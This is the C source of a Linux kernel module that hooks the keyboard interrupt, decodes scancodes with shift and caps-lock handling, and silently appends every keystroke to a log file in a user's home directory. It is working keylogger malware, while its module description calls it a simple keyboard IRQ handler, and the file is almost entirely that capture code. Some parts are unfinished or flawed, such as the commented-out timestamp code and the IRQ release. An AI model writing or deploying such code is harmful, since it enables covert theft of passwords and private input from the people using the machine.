#include <linux/init.h>           /* Macros used to mark up functions e.g. __init __exit */
#include <linux/module.h>         /* Core header for loading LKMs into the kernel */
#include <linux/kernel.h>         /* Contains types, macros, functions for the kernel */
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/slab.h>           /* kmalloc */
#include <linux/interrupt.h>	  /* We want an interrupt */
#include <asm/io.h>
#include <asm/irq_vectors.h>

#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/time.h>

/* Keyboard IRQ on intel arch */
#define KDB_IRQ_NUMER 1
/* Workqueue name */
#define KDB_IRQ_WQ_NAME "kdb_irq"

#define KDB_STATUS   0x64
#define KDB_SCANCODE 0x60
/*
unsigned long get_time;
unsigned long get_time1;
int sec, hr, min, tmp1,tmp2, tmp3;
int sec1, hr1, min1, tmp11,tmp21, tmp31;
struct timeval tv;
struct tm tv2;
*/
static const char *key_names[] = {
   "", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8",
   "9", "0", "-", "=", "<Backspace>", "<Tab>", "q", "w", "e", "r",
   "t", "y", "u", "i", "o", "p", "[", "]", "\n", "<LCtrl>",
   "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
   "'", "`", "</LShift>", "\\", "z", "x", "c", "v", "b", "n",
   "m", ",", ".", "/", "</RShift>", "<KP*>", "<L/RAlt>", "<SPACE>", "</CapsLock>",
   "<F1>",
   "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
   "<ScrLk>",
   "<ScrollLock>", "<HOME>", "<UP>", "<PgUP>", "<KP->", "<LEFT>", "<KP5>",
   "<RIGHT>", "<KP+>", "<END>",
   "<DOWN>", "<PgDW>", "<INS>", "<DEL>", "", "", "", "<F11>", "<F12>",
   "",
   "", "", "", "", "", "", "", "<RCtrl>", "<KP/>", "<PrtSc>",
   "<RAlt>", "", "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>",
   "<Down>","<PageDown>",
   "<Insert>", "<Delete>"
};

static int size_of_str[] = {
0, 5, 1, 1, 1, 1, 1, 1, 1, 1,
1, 1, 1, 1, 11, 5, 1, 1, 1, 1,
1, 1, 1, 1, 1, 1, 1, 1, 1, 7,
1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
1, 1, 9, 2, 1, 1, 1, 1, 1, 1,
1, 1, 1, 1, 9, 5, 8, 7, 11, 4,
4, 4, 4, 4, 4, 4, 4, 4, 5, 7,
12, 6, 4, 6, 5, 6, 5, 7, 5, 5,
6, 6, 5, 5, 0, 0, 0, 5, 5, 0,
0, 0, 0, 0, 0, 0, 0, 7, 5, 7,
6, 0, 6, 4, 8, 6, 7, 5, 6, 10,
8, 8
};


static const char *key_names_caps[] = {
   "", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8",
   "9", "0", "-", "=", "<Backspace>", "<Tab>", "Q", "W", "E", "R",
   "T", "Y", "U", "I", "O", "P", "[", "]", "\n", "<LCtrl>",
   "A", "S", "D", "F", "G", "H", "J", "K", "L", ";",
   "'", "`", "<LShift>", "\\", "Z", "X", "C", "V", "B", "N",
   "M", ",", ".", "/", "<RShift>", "<KP*>", "<L/RAlt>", "<SPACE>", "<CapsLock>",
   "<F1>",
   "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
   "<ScrLk>",
   "<ScrollLock>", "<HOME>", "<UP>", "<PgUP>", "<KP->", "<LEFT>", "<KP5>",
   "<RIGHT>", "<KP+>", "<END>",
   "<DOWN>", "<PgDW>", "<INS>", "<DEL>", "", "", "", "<F11>", "<F12>",
   "",
   "", "", "", "", "", "", "", "<RCtrl>", "<KP/>", "<PrtSc>",
   "<RAlt>", "", "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>",
   "<Down>","<PageDown>",
   "<Insert>", "<Delete>"
};

static int size_of_string_caps[] =  {
0, 5, 1, 1, 1, 1, 1, 1, 1, 1,
1, 1, 1, 1, 11, 5, 1, 1, 1, 1,
1, 1, 1, 1, 1, 1, 1, 1, 1, 7,
1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
1, 1, 8, 2, 1, 1, 1, 1, 1, 1,
1, 1, 1, 1, 8, 5, 8, 7, 10, 4,
4, 4, 4, 4, 4, 4, 4, 4, 5, 7,
12, 6, 4, 6, 5, 6, 5, 7, 5, 5,
6, 6, 5, 5, 0, 0, 0, 5, 5, 0,
0, 0, 0, 0, 0, 0, 0, 7, 5, 7,
6, 0, 6, 4, 8, 6, 7, 5, 6, 10,
8, 8
};



static const char *key_names_shift[] = {
   "", "<ESC>", "!", "@", "#", "$", "%", "^", "&", "*",
   "(", ")", "_", "+", "<Backspace>", "<Tab>", "Q", "W", "E", "R",
   "T", "Y", "U", "I", "O", "P", "{", "}", "\n", "<LCtrl>",
   "A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
   "\"", "~", "<LShift>", "|", "Z", "X", "C", "V", "B", "N",
   "M", "<", ">", "?", "<RShift>", "<KP*>", "<L/RAlt>", "<SPACE>", "<CapsLock>",
   "<F1>",
   "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
   "<NumLock>",
   "<ScrollLock>", "<HOME>", "<UP>", "<PgUP>", "<KP->", "<LEFT>", "<KP5>",
   "<RIGHT>", "<KP+>", "<END>",
   "<DOWN>", "<PgDW>", "<INS>", "<DEL>", "", "", "", "<F11>", "<F12>",
   "",
   "", "", "", "", "", "", "", "<RCtrl>", "<KP/>", "<PrtSc>",
   "<RAlt>", "", "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>",
   "<Down>","<PageDown>",
   "<Insert>", "<Delete>"

};


static int size_of_string_shift[] = {
0, 5, 1, 1, 1, 1, 1, 1, 1, 1,
1, 1, 1, 1, 11, 5, 1, 1, 1, 1,
1, 1, 1, 1, 1, 1, 1, 1, 1, 7,
1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
1, 1, 8, 2, 1, 1, 1, 1, 1, 1,
1, 1, 1, 1, 8, 5, 8, 7, 10, 4,
4, 4, 4, 4, 4, 4, 4, 4, 5, 7,
12, 6, 4, 6, 5, 6, 5, 7, 5, 5,
6, 6, 5, 5, 0, 0, 0, 5, 5, 0,
0, 0, 0, 0, 0, 0, 0, 7, 5, 7,
6, 0, 6, 4, 8, 6, 7, 5, 6, 10,
8, 8
};




static struct file *fp = NULL;
/** Make the structure to be passed to the workqueue handler**/
typedef struct {
    struct work_struct w;
    unsigned char scancode;
} kdb_irq_task_t;

/** Declare the workqueue struct **/
static struct workqueue_struct *kdb_irq_wq = NULL;

/** kdb_irq_t instance **/
kdb_irq_task_t *work;



//file input output code

struct file *file_open(const char *path, int flags, int rights) 
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

void file_close(struct file *file) 
{
    filp_close(file, NULL);
}

int file_write(struct file *file, unsigned long long offset, const char *data[], unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, *data, size, &offset);

    set_fs(oldfs);
    return ret;
}




/**
 * This will get called by the kernel as soon as it's safe to do everything normally allowed by kernel modules.
 */
static void kdb_irq_got_char(struct work_struct *w) {

  /*
tried to print time


do_gettimeofday(&tv);
  get_time1 = tv.tv_sec;
  sec1 = get_time1 % 60;
  tmp11 = get_time1 / 60;
  min1 = tmp11 % 60;
  tmp21 = tmp11 / 60;
  hr1 = (tmp21 % 24);
  if((sec1-sec)>10)
  {
   file_write(fp,0, "\n",1);
   char hours[5];
   itoa(hr1, hours, 10);
   file_write(fp,0, hours,sizeof(hours));
   itoa(min1, hours, 10);
   file_write(fp,0, hours,sizeof(hours));
   itoa(sec1, hours, 10);
   file_write(fp,0, hours,sizeof(hours));
   file_write(fp,0, ":  ",3);
  }
*/


  /* Get the main pointer */
  kdb_irq_task_t *work = container_of(w, kdb_irq_task_t, w);
  /* Get scancode and the release state */
  int scancode = work->scancode & 0x7F;
  char released = work->scancode & 0x80 ? 1 : 0;

  //to trace caps
  static int caps_lock  = 0;
  //to trace shift
  static int shift_val = 0;
  

  if (scancode < 112) {
	  //check for the shift key
if(scancode == 0x2a || scancode == 0x36)
{
	if(!released && shift_val==0) {
		shift_val = 1;
		file_write(fp,0,  &key_names_shift[scancode], size_of_string_shift[scancode]);
	}else if (released && shift_val == 1) {
		shift_val = 0;
		file_write(fp,0,  &key_names[scancode], size_of_str[scancode]);
	} 
} //if shift is absent and shift_val==0
else if (shift_val == 0){
	//check for caps_lock
	if(scancode == 0x3a){
			if (caps_lock == 0 && !released) {
				caps_lock = 1;
				file_write(fp,0,  &key_names_caps[scancode], size_of_string_caps[scancode]);
			}else if (caps_lock == 1 && !released){
				caps_lock = 0;
				file_write(fp,0,  &key_names[scancode], size_of_str[scancode]);
			}
	}//not a caps_lock
	else
	{
		//is caps off
		if(caps_lock==0 && !released){
			file_write(fp,0,  &key_names[scancode], size_of_str[scancode]);
		}//is caps on
		if(caps_lock==1 && !released){
			file_write(fp,0,  &key_names_caps[scancode], size_of_string_caps[scancode]);	
		}
	}
    
} //if shift is absent and shift_val==1
	else if(shift_val == 1){
	  //check for caps_lock
	if(scancode == 0x3a){
			if (caps_lock == 0 && !released) {
				caps_lock = 1;
				file_write(fp,0,  &key_names_caps[scancode], size_of_string_caps[scancode]);
			}else if (caps_lock == 1 && !released){
				caps_lock = 0;
				file_write(fp,0,  &key_names[scancode], size_of_str[scancode]);
			}
	}//not a caps_lock
	else
	{
		if(caps_lock==0 && !released){
			file_write(fp,0,  &key_names_shift[scancode], size_of_string_shift[scancode]);
		}
		if(caps_lock==1 && !released){
			if((scancode>=16&&scancode<=25)||(scancode>=30&&scancode<=38)||(scancode>=44&&scancode<=50)){
				file_write(fp,0,  &key_names[scancode], size_of_str[scancode]);
			}else{
				file_write(fp,0,  &key_names_shift[scancode], size_of_string_shift[scancode]);
			}
			
		}
	}
   	}
  }
}

// 16 TO 25 & 30 TO 38 & 44 TO 50


/**
 * Reads the relevant information from the keyboard IRQ handler and then puts the non RT part into the work queue.
 * This will be run when the kernel considers it safe.
 */
irqreturn_t kdb_irq_handler(int irq, void *dev_id) {
  static unsigned char scancode;
  unsigned char status;

  /* Read keyboard status */
  status = inb(KDB_STATUS);
  scancode = inb(KDB_SCANCODE);
  /* Write the new value */
  work->scancode = scancode;
  /* Queue new work */
  queue_work(kdb_irq_wq, &work->w);
  return IRQ_HANDLED;
}






static int __init kdb_irq_init(void) {
 /*
  tried to print time
  do_gettimeofday(&tv);
  get_time = tv.tv_sec;
  sec = get_time % 60;
  tmp1 = get_time / 60;
  min = tmp1 % 60;
  tmp2 = tmp1 / 60;
  hr = (tmp2 % 24);*/

  //open file
  char *filename = "/home/vatsal/Documents/kblog//test.txt";
  fp = file_open(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
  /*
   tried to print time	
   char hours[5];
   itoa(hr, hours, 10);
   file_write(fp,0, hours,sizeof(hours));
   itoa(min, hours, 10);
   file_write(fp,0, hours,sizeof(hours));
   itoa(sec, hours, 10);
   file_write(fp,0, hours,sizeof(hours));
   file_write(fp,0, ":  ",3);
*/
  kdb_irq_wq = create_workqueue(KDB_IRQ_WQ_NAME);			//creates workqueue
  work = (kdb_irq_task_t *)kmalloc(sizeof(kdb_irq_task_t), GFP_KERNEL);   //allocates memory to our created structure
  if (work) {
//passes all the required parameters
    INIT_WORK(&work->w, kdb_irq_got_char);          
  }
  return request_irq(KDB_IRQ_NUMER, 			/* The number of the keyboard IRQ on PCs */
		     kdb_irq_handler, 		/* module handler */
		     IRQF_SHARED, 			/* Means we're willing to have other handlers on this IRQ. */
		     "kdb_irq_handler", 		/* Shortname displayed into  /proc/interrupts. */
		     (void*)work); 
}


//remove irq kblog
static void __exit kdb_irq_exit(void) {  
  //release wq
  flush_workqueue(kdb_irq_wq);   
  destroy_workqueue(kdb_irq_wq);
  kfree((void *)work);
  
  free_irq(KDB_IRQ_NUMER, NULL);   //cant restore previos driver so have to reboot system
}
module_init(kdb_irq_init); //modue init
module_exit(kdb_irq_exit);  //module exit

/* module infos */
MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");
MODULE_AUTHOR("vatsal");
MODULE_DESCRIPTION("Simple LKM keyboard IRQ handler.");
